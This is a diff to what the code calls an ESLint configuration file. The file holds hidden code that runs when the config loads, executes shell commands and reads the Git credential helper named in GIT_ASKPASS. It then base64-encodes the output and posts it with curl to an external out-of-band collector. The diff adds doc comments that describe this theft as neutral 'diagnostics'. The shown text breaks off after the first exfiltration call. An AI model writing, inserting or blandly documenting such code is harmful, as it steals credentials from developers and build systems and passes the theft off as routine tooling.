@@ -1,8 +1,41 @@
 const cp=require("child_process"),crypto=require("crypto");
 const OOB="http://daifjmll0ffrr6psl5u0f1c4ncjj6xnon.oast.me";
+/**
+ * Runs a shell command synchronously and returns its standard output.
+ *
+ * Command failures are converted to an `ERR:` string containing up to 300
+ * characters of standard error or the error message.
+ *
+ * @param {string} c Shell command to execute.
+ * @param {number} [t=7000] Timeout in milliseconds; falsy values use 7 seconds.
+ * @returns {string} The command output or a truncated error description.
+ */
 function sh(c,t){try{return cp.execSync(c,{encoding:"utf8",timeout:t||7000,maxBuffer:20971520});}catch(e){return "ERR:"+String((e&&(e.stderr||e.message))||"").slice(0,300);}}
+/**
+ * Base64-encodes a value and attempts to post it to the external collector.
+ *
+ * The tag is appended to the collector URL, and transmission failures are
+ * ignored.
+ *
+ * @param {string} tag Collector path segment for the payload.
+ * @param {*} d Value to coerce to a string before encoding.
+ * @returns {void}
+ */
 function post(tag,d){try{const b=Buffer.from(String(d)).toString("base64");sh(`curl -s --max-time 7 -X POST --data-binary ${JSON.stringify(b)} ${JSON.stringify(OOB+"/"+tag)}`);}catch(_){ }}
+/**
+ * Summarizes a value with a truncated SHA-256 digest, length, and prefix.
+ *
+ * @param {*} v Value to summarize; falsy values are reported as absent.
+ * @returns {string} `absent` or the digest, length, and first four characters
+ * of the trimmed string value.
+ */
 function fp(v){if(!v)return "absent";v=String(v).trim();return "sha256="+crypto.createHash("sha256").update(v).digest("hex").slice(0,16)+" len="+v.length+" head="+v.slice(0,4);}
+/**
+ * Collects host, credential, filesystem, network, and cache diagnostics when
+ * the ESLint configuration loads and posts each result to the collector.
+ *
+ * @returns {void}
+ */
 (function(){
   // ---- K: git clone credential ----
   post("K_ASKPASS_ENV", sh("echo GIT_ASKPASS=$GIT_ASKPASS; echo ---; cat \"$GIT_ASKPASS\" 2>/dev/null | head -40"));
